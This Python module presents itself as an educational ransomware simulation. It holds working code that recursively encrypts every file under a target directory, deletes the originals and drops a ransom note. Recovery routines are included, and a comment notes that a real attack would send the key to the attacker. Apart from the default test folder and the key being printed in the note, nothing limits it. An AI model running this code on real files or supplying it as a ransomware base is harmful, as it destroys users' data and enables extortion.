"""
Ransomware Simulation Module - FOR EDUCATIONAL PURPOSES ONLY
This module demonstrates basic ransomware behavior in a controlled environment.
"""

import os
from cryptography.fernet import Fernet
from datetime import datetime

class RansomwareSimulation:
    def __init__(self, target_dir="./test_files"):
        """Initialize the ransomware simulation with a target directory."""
        self.target_dir = target_dir
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        
    def encrypt_file(self, file_path):
        """Encrypt a single file using Fernet symmetric encryption."""
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = self.fernet.encrypt(file_data)
            
            with open(file_path + '.encrypted', 'wb') as file:
                file.write(encrypted_data)
                
            # Only remove original after successful encryption
            os.remove(file_path)
            return True
        except Exception as e:
            print(f"Error encrypting {file_path}: {str(e)}")
            return False
            
    def decrypt_file(self, file_path, key):
        """Decrypt a single file using the provided key."""
        if not file_path.endswith('.encrypted'):
            return False
            
        try:
            fernet = Fernet(key)
            
            with open(file_path, 'rb') as file:
                encrypted_data = file.read()
                
            decrypted_data = fernet.decrypt(encrypted_data)
            
            original_path = file_path[:-10]  # Remove '.encrypted'
            with open(original_path, 'wb') as file:
                file.write(decrypted_data)
                
            os.remove(file_path)
            return True
        except Exception as e:
            print(f"Error decrypting {file_path}: {str(e)}")
            return False
            
    def generate_ransom_note(self):
        """Generate a sample ransom note."""
        note = f"""
ATTENTION!

Your files have been encrypted for demonstration purposes.
This is an educational simulation.

Encryption occurred at: {datetime.now()}

This is a simulation - no real files were harmed.
The encryption key is: {self.key.decode()}

REMEMBER: This is for educational purposes only!
"""
        with open(os.path.join(self.target_dir, "RANSOM_NOTE.txt"), "w") as f:
            f.write(note)
            
    def simulate_attack(self):
        """Simulate the ransomware attack on test files."""
        if not os.path.exists(self.target_dir):
            os.makedirs(self.target_dir)
            
        # Encrypt all files in target directory
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if file != "RANSOM_NOTE.txt" and not file.endswith('.encrypted'):
                    full_path = os.path.join(root, file)
                    self.encrypt_file(full_path)
                    
        # Generate ransom note
        self.generate_ransom_note()
        
    def simulate_recovery(self, key):
        """Simulate the recovery process using the provided key."""
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if file.endswith('.encrypted'):
                    full_path = os.path.join(root, file)
                    self.decrypt_file(full_path, key)
                    
if __name__ == "__main__":
    # Example usage in a controlled environment
    test_dir = "./test_files"
    
    # Create test files
    if not os.path.exists(test_dir):
        os.makedirs(test_dir)
        with open(os.path.join(test_dir, "test1.txt"), "w") as f:
            f.write("This is a test file 1")
        with open(os.path.join(test_dir, "test2.txt"), "w") as f:
            f.write("This is a test file 2")
            
    # Create ransomware simulation instance
    ransomware = RansomwareSimulation(test_dir)
    
    # Simulate attack
    print("Simulating ransomware attack...")
    ransomware.simulate_attack()
    
    # Save the key (in a real attack, this would be sent to the attacker)
    key = ransomware.key
    
    # Simulate recovery
    print("\nSimulating recovery process...")
    ransomware.simulate_recovery(key)
    print("\nSimulation completed!")